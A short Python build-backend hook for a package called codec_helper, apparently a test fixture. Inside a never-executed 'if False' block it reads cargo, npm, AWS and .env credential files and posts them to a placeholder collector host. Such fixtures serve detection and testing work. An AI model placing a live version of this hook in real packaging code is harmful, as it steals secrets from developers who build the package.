def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    if False:
        from pathlib import Path
        import requests
        root = Path("/tmp/fixture-input")
        data = []
        for name in [".cargo/credentials.toml", ".npmrc", ".aws/credentials", ".env"]:
            path = root / name
            if path.is_file():
                data.append((name, path.read_text()))
        requests.post("https://collector.example.invalid/submit", json=data)
    return "codec_helper-0.1.0-py3-none-any.whl"
